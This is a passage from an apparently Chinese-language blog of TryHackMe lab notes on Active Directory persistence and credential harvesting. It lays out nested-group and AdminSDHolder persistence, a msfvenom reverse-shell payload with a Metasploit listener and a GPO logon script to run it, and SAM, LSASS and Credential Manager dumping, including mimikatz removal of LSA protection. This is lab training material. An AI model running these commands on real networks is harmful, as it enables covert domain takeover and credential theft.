style="color: #98C379">&quot;irene.leach_nestgroup5&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Members </span><span style="color: #98C379">&quot;irene.leach_nestgroup4&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 把创建的第五个组加入 Domain Admins 组里</span></span><span class="line"><span style="color: #56B6C2">Add-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;Domain Admins&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Members </span><span style="color: #98C379">&quot;irene.leach_nestgroup5&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 把我们的低权限用户加到创建的第一个组里</span></span><span class="line"><span style="color: #56B6C2">Add-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;irene.leach_nestgroup1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Members </span><span style="color: #98C379">&quot;irene.leach&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 查看组成员</span></span><span class="line"><span style="color: #56B6C2">Get-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;Domain Admins&quot;</span></span></code></pre></div></div></figure><p>现实中一般是用现有的组来进行嵌套。</p><h2 id="Persistence-through-ACLs"><a href="#Persistence-through-ACLs" class="headerlink" title="Persistence through ACLs"></a>Persistence through ACLs</h2><p>这一节则是利用 AD 组的模板的定时同步特性去持久化。</p><p>有时候，我们需要的不仅仅是针对普通 AD 组的持久化。如果我们想同时对所有受保护的组进行持久化，该怎么办？</p><h3 id="通过-AD-组模板进行持久化"><a href="#通过-AD-组模板进行持久化" class="headerlink" title="通过 AD 组模板进行持久化"></a>通过 AD 组模板进行持久化</h3><p>虽然我们可以将我们控制的账户直接添加到所有能找到的特权组中，但蓝队仍然可以进行清理并移除我们的成员资格。为了获得更好的持久化效果，并让蓝队百思不得其解，我们应该转而<strong>注入到生成默认组的模板中</strong>。通过注入这些模板，即使他们移除了我们的成员资格，我们只需等待模板刷新，就能再次获得成员资格。</p><p>其中一个模板就是 <strong>AdminSDHolder 容器</strong>。这个容器存在于每个 AD 域中，它的访问控制列表（ACL）被用作一个模板，来复制权限到所有受保护的组。受保护的组包括“域管理员（Domain Admins）”、“管理员（Administrators）”、“企业管理员（Enterprise Admins）”和“架构管理员（Schema Admins）”等特权组。完整的组列表可以在这里找到。</p><p>一个名为 <strong>SDProp</strong> 的进程会每隔 60 分钟，将 AdminSDHolder 容器的 ACL 应用到所有受保护的组。因此，我们可以写入一个 ACE（访问控制条目），<strong>授予我们在所有受保护组上的完全权限</strong>。如果蓝队没有意识到这种类型的持久化正在被使用，他们会感到非常沮丧。因为每次他们移除受保护对象或组上不适当的权限时，这些权限都会在一小时内重新出现。由于这种重建是通过正常的 AD 进程发生的，它也不会向蓝队发出任何警报，使得他们很难查明持久化的来源。</p><h3 id="使用-AdminSDHolder-持久化"><a href="#使用-AdminSDHolder-持久化" class="headerlink" title="使用 AdminSDHolder 持久化"></a>使用 AdminSDHolder 持久化</h3><p>为了将持久性部署到 AdminSDHolder，我们将使用 Microsoft 管理控制台（MMC）。为避免将用户从 RDP 会话中踢出，最好使用低权限凭据 RDP 进入 THMWRK1，使用 runas 命令注入管理员凭据，然后从这个新终端执行 MMC：</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">runas</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">netonly</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:thmchilddc.tryhackme.</span><span style="color: #E06C75">loc</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Administrator</span><span style="color: #ABB2BF"> cmd.exe</span></span></code></pre></div></div></figure><p>add the Users and Groups Snap-in (File-&gt;Add Snap-In-&gt;Active Directory Users and Computers). Make sure to enable Advanced Features (View-&gt;Advanced Features 要选中那个域名才会出现).</p><p>找到 AdminSDHolder 组</p><img src="/thm_ad/image-20250807215110026.png" class="" title="image-20250807215110026"><p>右键 -&gt; 属性 -&gt; 安全，把我们的低权限账户加进去，然后授予完全控制权限。</p><img src="/thm_ad/image-20250807215259716.png" class="" title="image-20250807215259716"><h3 id="SDProp"><a href="#SDProp" class="headerlink" title="SDProp"></a>SDProp</h3><p>现在我们只需等待 60 分钟，用户就可以完全控制所有受保护组了。这是因为安全描述符传播器（SDProp）服务每 60 分钟自动执行一次，并将此更改传播到所有受保护组。在 C:\Tools\ 目录中（我没找到，手动传的），提供了一个脚本 <a href="https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1#L20">Invoke-ADSDPropagation</a>，他可以让这个行为立即执行。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">Import-Module</span><span style="color: #ABB2BF"> .</span><span style="color: #56B6C2">\Invoke-ADSDPropagation.ps1</span></span><span class="line"><span style="color: #56B6C2">Invoke-ADSDPropagation</span></span></code></pre></div></div></figure><img src="/thm_ad/image-20250807220033428.png" class="" title="image-20250807220033428"><p>执行之后马上就能看到这个用户被加上权限了，可以自己试验把他删了，然后手动执行一下脚本他又回来了。不过我们用户不会在这个组里面，只是有这个组的编辑权限，还要手动加进去。</p><h3 id="对蓝队来说简直是雪上加霜"><a href="#对蓝队来说简直是雪上加霜" class="headerlink" title="对蓝队来说简直是雪上加霜"></a>对蓝队来说简直是雪上加霜</h3><p>想象一下，把这种技术和之前讨论过的“嵌套组”结合起来。当蓝队刚通过无数次修改组权限来清除你的访问时，60 分钟后，你又可以重新来过。除非蓝队知道权限正在通过 <strong>AdminSDHolder 组</strong>被更改，否则他们会每隔一小时就感到困惑不解。由于这种持久化是通过一个合法的 AD 服务传播的，他们很可能每次都无法察觉。如果你真的想实现长久持久化，你可以在 AdminSDHolder 组中授予 <strong>Domain Users 组</strong>完全控制权限，这意味着任何低权限用户都将获得对所有受保护组的完全控制。再结合一次完整的 <code>DC Sync</code> 攻击，蓝队将不得不重置域中每个账户的凭据，才能将我们彻底清除。</p><h2 id="Persistence-through-GPOs"><a href="#Persistence-through-GPOs" class="headerlink" title="Persistence through GPOs"></a>Persistence through GPOs</h2><p>这一节则是用组策略对象 GPO 去内置一些启动脚本达成持久化。</p><h3 id="域范围持久化"><a href="#域范围持久化" class="headerlink" title="域范围持久化"></a>域范围持久化</h3><p>以下是一些常见的 <strong>GPO 持久化技术</strong>：</p><ul><li><strong>受限组（Restricted Group）成员资格</strong>：这可以让我们获得域中所有主机的管理员访问权限。</li><li><strong>登录脚本部署</strong>：这能确保每当有用户认证登录到域中的主机时，我们都能获得一个反向 Shell 连接。</li></ul><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 生成小马</span></span><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/x64/meterpreter/reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">lhost=persistad</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">lport=</span><span style="color: #D19A66">4445</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">exe</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">recopec_shell.exe</span></span></code></pre></div></div></figure><p>Windows 允许我们通过登录 GPO 执行批处理或 PowerShell 脚本。批处理脚本通常比 PowerShell 脚本更稳定，因此让我们创建一个脚本，将可执行文件复制到主机，并在用户验证后执行。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">copy</span><span style="color: #ABB2BF"> \\za.tryhackme.</span><span style="color: #E06C75">loc</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">sysvol</span><span style="color: #ABB2BF">\za.tryhackme.</span><span style="color: #E06C75">loc</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">scripts</span><span style="color: #ABB2BF">\recopec_shell.exe C:\</span><span style="color: #E06C75">tmp</span><span style="color: #ABB2BF">\recopec_shell.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> &amp;&amp;</span><span style="color: #E06C75"> timeout</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">t</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">20</span><span style="color: #ABB2BF"> &amp;&amp;</span><span style="color: #E06C75"> C</span><span style="color: #ABB2BF">:\</span><span style="color: #E06C75">tmp</span><span style="color: #ABB2BF">\recopec_shell.exe</span></span></code></pre></div></div></figure><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 复制文件到 sysvol 目录下</span></span><span class="line"><span style="color: #61AFEF">scp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">recopec_shell.exe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">za</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/</span></span><span class="line"><span style="color: #61AFEF">scp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">recopec_script</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">za</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 启动 MSF 监听器</span></span><span class="line"><span style="color: #61AFEF">msfconsole</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-q</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit&quot;</span></span></code></pre></div></div></figure><h3 id="创建-GPO"><a href="#创建-GPO" class="headerlink" title="创建 GPO"></a>创建 GPO</h3><p>照例用 Runas 注入凭据，然后添加 <strong>Group Policy Management</strong> 组件。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe</span></span></code></pre></div></div></figure><p>从技术上讲，我们可以将内容写入 “默认域策略”，该策略应传播到所有 AD 对象，但我们将采用更狭义的方法来完成任务，只是为了展示过程。之后，您可以尝试将更改应用到整个域。</p><p>我们将编写一个应用于所有管理员的 GPO，因此右键单击 Admins OU 并选择在此域中创建一个 GPO，然后将其链接到此处。</p><p>貌似被修复了：<a href="https://support.microsoft.com/en-us/topic/ms15-011-vulnerability-in-group-policy-could-allow-remote-code-execution-february-10-2015-91b4bda2-945d-455b-ebbb-01d1ec191328">https://support.microsoft.com/en-us/topic/ms15-011-vulnerability-in-group-policy-could-allow-remote-code-execution-february-10-2015-91b4bda2-945d-455b-ebbb-01d1ec191328</a></p><p>后面的走不下去了。</p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>我们有几种不同的方法在 AD 中维持权限。其中一些方法的持久性比其他方法更好。为了确保您的持久性不会被蓝队删除，您必须创造性地考虑您的持久性。此外，你不应该等到整个域攻陷后才部署持久性。在每一轮横向移动和权限升级之后，都应部署持久性。</p><h3 id="其他持久化技术"><a href="#其他持久化技术" class="headerlink" title="其他持久化技术"></a>其他持久化技术</h3><p>在本网络中，我们介绍了可用于在 AD 中持久化的几种技术，以下是同样值得一提的持久化技术：</p><ul><li><strong><a href="https://stealthbits.com/blog/unlocking-all-the-doors-to-active-directory-with-the-skeleton-key-attack/">Skeleton keys</a> -</strong> 使用 Mimikatz，我们可以部署一把“万能钥匙”。Mimikatz 会创建一个默认密码，这个密码对域内的任何账户都有效。同时，账户的原始密码仍然可用，这使得很难察觉到该攻击的发生。利用这把万能钥匙，攻击者可以冒充域内的任何账户。</li><li><strong><a href="https://adsecurity.org/?p=1714">Directory Service Restore Mode (DSRM)</a> -</strong> 域控制器有一个用于紧急情况的内置管理员账户，称为 DSRM 账户。这个密码在服务器被提升为域控制器时设置，并且很少更改。在紧急情况下，这个密码可以用来恢复域控制器。攻击者可以使用 Mimikatz 提取这个密码，并利用它获得对环境中域控制器的持久化管理员权限。</li><li><strong><a href="https://adsecurity.org/?p=1760">Malicious Security Support Provider (SSP)</a> -</strong> 通过利用 SSP 接口，可以添加新的 SSP。我们可以将 Mimikatz 的 <code>mimilib</code> 添加为一个 SSP，它会把所有认证尝试的凭据记录到一个文件中。我们可以指定一个网络位置来记录，这使得 <code>mimilib</code> 可以在用户认证到被入侵主机时将凭据发送给我们，从而实现持久化。</li><li><strong><a href="https://adsecurity.org/?p=2753">Computer Accounts</a></strong> <strong>-</strong> 计算机账户的密码通常每 30 天自动轮换一次。然而，我们可以修改一个计算机账户的密码，从而阻止这种自动轮换。与此同时，我们还可以授予该计算机账户对其他机器的管理员访问权限。这将使我们能够像使用普通账户一样使用这个计算机账户，而这种持久化的唯一迹象就是该账户对其他主机拥有管理员权限，这在 AD 中通常是正常行为，因此可能不会被检测到。</li></ul><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><p>防御 AD 持久化可能非常棘手。在某些情况下，持久化的根源可能深到需要完全重建整个域。然而，我们仍然可以采取一些措施来检测已部署的持久化技术：</p><ul><li><strong>异常账户登录事件</strong>：这是最常见的持久化告警。任何时候，当凭据违反了分层模型时，都可能意味着存在持久化。</li><li><strong>编写特定检测规则</strong>：针对每一种提到的持久化技术，都可以编写特定的检测规则。例如，当机器账户的密码发生更改时、ACL 权限被随意更新时，或有新的 GPO 被创建时。</li><li><strong>保护特权资源</strong>：对抗持久化的最佳防御是保护特权资源。尽管低权限访问可以用来部署一些持久化技术，但那些真正可怕的技术只有在攻击者获得域的特权访问后才可用。</li></ul><hr><h1 id="Credentials-Harvesting"><a href="#Credentials-Harvesting" class="headerlink" title="Credentials Harvesting"></a>Credentials Harvesting</h1><p>这个房间讲的就是一些凭证收集的技巧了，应该记录在速查里面的</p><h2 id="直接访问的凭据"><a href="#直接访问的凭据" class="headerlink" title="直接访问的凭据"></a>直接访问的凭据</h2><ul><li>命令历史</li><li>配置文件（Web App, FTP 文件等）</li><li>备份文件</li><li>共享文件和文件夹</li><li>注册表</li><li>源码</li><li>数据库</li><li>密码管理器</li></ul><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># PowerShell 命令历史</span></span><span class="line"><span style="color: #ABB2BF">type C:\Users\Recopec\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 注册表搜索密码关键字</span></span><span class="line"><span style="color: #ABB2BF">reg query HKLM </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">f password </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">t REG_SZ </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">s</span></span><span class="line"><span style="color: #ABB2BF">reg query HKCU </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">f password </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">t REG_SZ </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">s</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># Active Directory</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 获取域内用户用户名 SamAccountName 和描述</span></span><span class="line"><span style="color: #56B6C2">Get-ADUser</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Filter </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Properties </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> | select Name,SamAccountName,Description</span></span></code></pre></div></div></figure><h2 id="Windows-本地凭据"><a href="#Windows-本地凭据" class="headerlink" title="Windows 本地凭据"></a>Windows 本地凭据</h2><p>方法1：键盘记录器，MSF 自带</p><h3 id="SAM-文件"><a href="#SAM-文件" class="headerlink" title="SAM 文件"></a>SAM 文件</h3><p>SAM 是一个 Microsoft Windows 数据库，其中包含用户名和密码等本地账户信息。SAM 数据库以加密格式存储这些详细信息，使其更难被检索。此外，在 Windows 操作系统运行时，任何用户都无法读取和访问该数据库。不过，有多种方法和攻击方式可以转储 SAM 数据库的内容。</p><h3 id="不能读取-SAM-文件的解决办法"><a href="#不能读取-SAM-文件的解决办法" class="headerlink" title="不能读取 SAM 文件的解决办法"></a>不能读取 SAM 文件的解决办法</h3><p>因为权限或者其他问题导致没法直接把 sam 文件读取出来。</p><h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>这个就不用说了把，直接 hashdump 就出来了。</p><h4 id="Volume-Shadow-Copy-Service"><a href="#Volume-Shadow-Copy-Service" class="headerlink" title="Volume Shadow Copy Service"></a>Volume Shadow Copy Service</h4><p>这个像是打一个快照一样，然后去访问这个快照，就绕过了访问限制，这里我们用 wmic 完成这个操作，注意需要管理员权限。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 给 C 盘创建一个 shadowcopy</span></span><span class="line"><span style="color: #ABB2BF">wmic shadowcopy call create Volume</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&#39;C:\&#39;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># vssadmin:  Volume Shadow Copy Service administrative command-line tool</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 查看 shadowcopy 列表</span></span><span class="line"><span style="color: #ABB2BF">vssadmin list shadows</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># Shadow Copy Volume: 即我们要找的目录</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 复制我们要的文件</span></span><span class="line"><span style="color: #ABB2BF">copy \\</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\thm\Desktop\sam</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 复制解密密钥</span></span><span class="line"><span style="color: #ABB2BF">copy \\</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\thm\Desktop\system</span></span></code></pre></div></div></figure><p>SAM 数据库是被 RC4 或者 AES 加密的，我们需要一个解密密钥，在  <code>c:\Windows\System32\Config\system</code> 下。</p><h4 id="Registry-Hives"><a href="#Registry-Hives" class="headerlink" title="Registry Hives"></a>Registry Hives</h4><p>另一种转储 SAM 数据库内容的方法是通过 Windows 注册表。Windows 注册表还存储了部分 SAM 数据库内容的副本，供 Windows 服务使用。幸运的是，我们可以使用 reg.exe 工具保存 Windows 注册表的值。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 导出这两个文件</span></span><span class="line"><span style="color: #ABB2BF">reg save HKLM\sam C:\users\thm\Desktop\sam</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">reg</span></span><span class="line"><span style="color: #ABB2BF">reg save HKLM\system C:\users\thm\Desktop\system</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">reg</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 解密</span></span><span class="line"><span style="color: #ABB2BF">python secretsdump.py </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">sam </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">home</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">kali</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">thm</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">sam</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">system </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">home</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">kali</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">thm</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">system</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">reg local</span></span></code></pre></div></div></figure><p>请注意，如果我们将输出结果与从 Metasploit 的 Hashdump 中获得的 NTLM 哈希值进行比较，结果是不同的。原因是其他账户属于 AD，它们的信息没有存储在我们转储的系统文件中。要解密它们，我们需要转储 Windows 文件中的 SECURITY 文件，其中包含解密 Active Directory 账户所需的文件。<br>获得 NTLM 哈希值后，如果可以猜到，我们可以尝试使用 Hashcat 对其进行破解，或者使用不同的技术使用哈希值冒充用户。</p><h2 id="本地安全管理子系统服务"><a href="#本地安全管理子系统服务" class="headerlink" title="本地安全管理子系统服务"></a>本地安全管理子系统服务</h2><h3 id="什么是-LSASS"><a href="#什么是-LSASS" class="headerlink" title="什么是 LSASS"></a>什么是 LSASS</h3><p>本地安全授权服务器服务（LSASS）是一个 Windows 进程，负责处理操作系统安全策略并在系统中执行。它验证登录账户并确保密码、哈希值和 Kerberos 票据。Windows 系统将凭证存储在 LSASS 进程中，以便用户访问网络资源，如文件共享、SharePoint 网站和其他网络服务，而无需在每次连接时输入凭证。<br>因此，LSASS 进程是红队人员的目标，因为它存储了用户账户的敏感信息。LSASS 通常会被滥用来转储凭证，以提升权限、窃取数据或横向移动。幸运的是，如果我们拥有管理员权限，就可以转储 LSASS 的进程内存。Windows 系统允许我们创建转储文件，即给定进程的快照。这可以通过桌面访问（图形用户界面）或命令提示符完成。这种攻击在 MITRE ATT&amp;CK 框架中被定义为 “<a href="https://attack.mitre.org/techniques/T1003/001/">OS Credential Dumping: LSASS Memory (T1003)</a>“。</p><h3 id="转储-LSASS"><a href="#转储-LSASS" class="headerlink" title="转储 LSASS"></a>转储 LSASS</h3><p>首先是不借助工具的情况。直接任务管理器 -&gt; 右键创建 dump 文件。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 用 SysinternalsSuite DUMP lsass</span></span><span class="line"><span style="color: #ABB2BF">c:\Tools\SysinternalsSuite\</span><span style="color: #56B6C2">procdump.exe</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">accepteula </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ma </span><span style="color: #56B6C2">lsass.exe</span><span style="color: #ABB2BF"> c:\Tools\Mimikatz\lsass_dump</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 用 mimikatz dump</span></span><span class="line"><span style="color: #56B6C2">mimikatz.exe</span></span><span class="line"><span style="color: #ABB2BF">privilege:debug</span></span><span class="line"><span style="color: #ABB2BF">sekurlsa::logonpasswords</span></span><span class="line"><span style="color: #7F848E; font-style: italic">#ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)</span></span></code></pre></div></div></figure><p>受害者必须登录进系统里，这个用户的凭证才会被缓存。</p><h3 id="保护的-LSASS"><a href="#保护的-LSASS" class="headerlink" title="保护的 LSASS"></a>保护的 LSASS</h3><p>2012 年，微软实施了 LSA 保护措施，以防止访问 LSASS 从内存中提取凭证。</p><p>要启用 LSASS 保护，我们可以将 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa 中的注册表 RunAsPPL DWORD 值修改为 1。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 如果你是跟着 Room 走的，上面的命令会报错，你需要执行下面的命令</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 打开到工具目录</span></span><span class="line"><span style="color: #ABB2BF">cd c:\Tools\Mimikatz</span></span><span class="line"><span style="color: #ABB2BF">.</span><span style="color: #56B6C2">/mimikatz.exe</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 关闭 LSA 保护</span></span><span class="line"><span style="color: #ABB2BF">!</span><span style="color: #56B6C2">+</span></span><span class="line"><span style="color: #ABB2BF">!processprotect </span><span style="color: #56B6C2">/</span><span style="color: #C678DD">process</span><span style="color: #ABB2BF">:</span><span style="color: #56B6C2">lsass.exe</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">remove</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 现在你就可以再跑一遍上面的步骤了</span></span></code></pre></div></div></figure><h2 id="Windows-凭据管理器"><a href="#Windows-凭据管理器" class="headerlink" title="Windows 凭据管理器"></a>Windows 凭据管理器</h2><p>什么是凭证管理器？<br>凭证管理器是 Windows 的一项功能，用于存储网站、应用程序和网络的登录敏感信息。它包含用户名、密码和互联网地址等登录凭据。有四个凭证类别：</p><ul><li>网络凭证包含存储在互联网浏览器或其他应用程序中的身份验证详细信息。</li><li>Windows 凭据包含 Windows 身份验证详细信息，如 NTLM 或 Kerberos。</li><li>通用凭证包含基本身份验证详细信息，如明文用户名和密码。</li><li>基于证书的凭证： 这些是基于证书的身份验证详细信息。</li></ul><h3 id="访问凭据管理器"><a href="#访问凭据管理器" class="headerlink" title="访问凭据管理器"></a>访问凭据管理器</h3><p>可以直接在 GUI 上查看 (Control Panel -&gt; User Accounts -&gt; Credential Manager) ，或者使用 Microsoft Credentials Manager <code>vaultcmd</code> 工具。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 显示系统里可用的的保险库</span></span><span class="line"><span style="color: #E06C75">vaultcmd</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">list</span></span><span class="line"><span style="color: #ABB2BF"># 检查保险库里面存储的内容</span></span><span class="line"><span style="color: #E06C75">VaultCmd</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">listproperties</span><span style="color: #ABB2BF">:</span><span style="color: #98C379">&quot;Web Credentials&quot;</span></span><span class="line"><span style="color: #ABB2BF"># 列出凭据存储的更多信息</span></span><span class="line"><span style="color: #E06C75">VaultCmd</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">listcreds</span><span style="color: #ABB2BF">:</span><span style="color: #98C379">&quot;Web Credentials&quot;</span></span></code></pre></div></div></figure><h3 id="转储凭据"><a href="#转储凭据" class="headerlink" title="转储凭据"></a>转储凭据</h3><p>VaultCmd 无法显示密码，但我们可以依靠其他 PowerShell 脚本，如  <a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1">Get-WebCredentials.ps1</a>，它已包含在所附的虚拟机中，执行脚本时要带上 bypass 命令。</p><p><code>Bypass policy</code> 指的是 PowerShell 的<strong>执行策略（Execution Policy）</strong>。</p><p>这是 PowerShell 